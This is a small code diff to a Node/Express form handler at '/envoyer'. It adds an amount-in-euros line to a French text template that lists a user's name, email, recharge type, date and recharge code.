@@ -32,6 +32,7 @@ app.post("/envoyer", async (req, res) => {
       Prénom : ${data.prenom}
       Email : ${data.email}
       Recharge : ${data.typeRecharge}
+      Montant : ${data.montant} €
       Date : ${data.dateAchat}
       Code : ${data.codeRecharge}
       Cacher le code : ${data.cacherCode}
